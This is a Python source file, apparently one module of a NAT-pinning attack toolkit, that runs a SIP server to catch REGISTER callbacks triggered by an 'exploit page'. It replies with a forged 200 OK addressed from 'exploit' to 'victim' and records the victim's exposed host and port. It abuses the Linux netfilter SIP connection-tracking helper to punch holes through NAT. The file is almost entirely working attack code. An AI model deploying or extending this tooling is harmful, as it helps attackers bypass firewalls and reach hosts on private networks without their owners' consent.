#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time

class SIPProtoHandler(asyncore.dispatcher_with_send):
	def __init__(self,conn_sock, client_address, server):
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort))
	#end def
	def handle_REGISTER(self, data):#UDP ONLY???
		via = ""
		seq = ""
		remhost = ""
		remport = ""
		callid=""
		contact=""
		response="""SIP/2.0 200 OK
CSeq: $seq$
Via: SIP/2.0/TCP $ip$:$port$;branch=z9hG4bK8ec10d9c-552b-e311-9e23-d4bed969aff2;rport
From: <sip:natpin@exploit>;tag=6c11ef9b-552b-e311-9e23-d4bed969aff2
Call-ID: 8c05ef9b-552b-e311-9e23-d4bed969aff2@ai1
To: <sip:natpin@victim>
Contact: <sip:natpin@$ip$:$port$>;q=1;expires=12000
Server:  NATPIN
Content-Length: 0

"""
		for line in data:
			if "Via:" in line:
				via = line.strip()
				via_data = line.split(" ")
				callback = via_data[2].split(";")[0]
				remhost = callback.split(":")[0]
				remport= callback.split(":")[1]
			if "CSeq:" in line:
				seq = line.upper().replace("CSEQ: ","")
			if "Call-ID:" in line:
				callid = line.upper().replace("CALL-ID: ","")
		if via!= "" and seq !="" and callid != "":
			self.server.log("SIP REGISTER callback (UDP) received for " + remhost + " on port " + remport)	
			retpack = response
			retpack = retpack.replace("$seq$",seq)
			retpack = retpack.replace("$ip$",remhost)
			retpack = retpack.replace("$port$",remport)
			retpack = retpack.replace("$seq$",seq)
			self.send(retpack)
			#XXX TODO Validate wether onlu UDP is supported, 
			#I deduced this from line 1096 in http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/net/netfilter/nf_conntrack_sip.c, 
			#but could be wrong 
			self.server.callback("SIP REGISTER", "none",remhost,int(remport),self.getpeername())
		else:
			self.server.log("Received invalid REGISTER request")
	#end def
	def handle_read(self):
		data = self.recv(4096)
		if data !="":
			via = ""
			lines = data.split("\n")
			if "REGISTER" in lines[0]: self.handle_REGISTER(lines)
			elif "INVITE" in lines[0]: self.server.log("RECEIVED INVITE")
	#end def
#end class

class Server(Base):
	def __init__(self,serverPort=5060,sCallbackType="socket", verbose=False):
		self.TYPE = "SIP Server"
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
		Base.__init__(self,"TCP",serverPort,sCallbackType,verbose)
		self.log("Started")
	#end def
	def protocolhandler(self,conn, addr):
		self.HANDLER = SIPProtoHandler(conn,addr,self)
	#end def
#end class
